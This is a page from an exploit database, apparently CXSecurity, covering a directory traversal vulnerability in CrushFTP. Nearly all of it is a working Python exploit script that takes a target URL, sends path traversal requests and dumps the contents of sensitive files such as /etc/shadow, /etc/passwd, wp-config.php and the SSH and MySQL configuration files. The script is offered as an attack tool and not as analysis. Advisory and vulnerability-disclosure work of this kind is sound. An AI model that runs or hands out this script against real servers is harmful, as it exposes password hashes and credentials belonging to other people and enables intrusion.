---
title: CrushFTP Directory Traversal
url: https://cxsecurity.com/issue/WLB-2024050049
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-05-17
fetch_date: 2025-10-06T17:13:37.801042
---

# CrushFTP Directory Traversal

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **CrushFTP Directory Traversal** **2024.05.16**  Credit:  **[Abdualhadi Khalifa](https://cxsecurity.com/author/Abdualhadi%2BKhalifa/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-22](https://cxsecurity.com/cwe/CWE-22 "Click to see CWE-22")** | |

## Exploit Title: CrushFTP Directory Traversal
## Google Dork: N/A
# Date: 2024-04-30
# Exploit Author: [Abdualhadi khalifa (https://twitter.com/absholi\_ly)
## Vendor Homepage: https://www.crushftp.com/
## Software Link: https://www.crushftp.com/download/
## Version: below 10.7.1 and 11.1.0 (as well as legacy 9.x)
## Tested on: Windows10
import requests
import re
# Regular expression to validate the URL
def is\_valid\_url(url):
regex = re.compile(
r'^(?:http|ftp)s?://' # http:// or https://
r'(?:(?:A-Z0-9?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|' # domain...
r'localhost|' # localhost...
r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|' # ...or ipv4
r'\[?[A-F0-9]\*:[A-F0-9:]+\]?)' # ...or ipv6
r'(?::\d+)?' # optional: port
r'(?:/?|[/?]\S+)$', re.IGNORECASE)
return re.match(regex, url) is not None
# Function to scan for the vulnerability
def scan\_for\_vulnerability(url, target\_files):
print("Scanning for vulnerability in the following files:")
for target\_file in target\_files:
print(target\_file)
for target\_file in target\_files:
try:
response = requests.get(url + "?/../../../../../../../../../../" + target\_file, timeout=10)
if response.status\_code == 200 and target\_file.split('/')[-1] in response.text:
print("vulnerability detected in file", target\_file)
print("Content of file", target\_file, ":")
print(response.text)
else:
print("vulnerability not detected or unexpected response for file", target\_file)
except requests.exceptions.RequestException as e:
print("Error connecting to the server:", e)
# User input
input\_url = input("Enter the URL of the CrushFTP server: ")
# Validate the URL
if is\_valid\_url(input\_url):
# Expanded list of allowed files
target\_files = [
"/var/www/html/index.php",
"/var/www/html/wp-config.php",
"/etc/passwd",
"/etc/shadow",
"/etc/hosts",
"/etc/ssh/sshd\_config",
"/etc/mysql/my.cnf",
# Add more files as needed
]
# Start the scan
scan\_for\_vulnerability(input\_url, target\_files)
else:
print("Invalid URL entered. Please enter a valid URL.")

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024050049)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top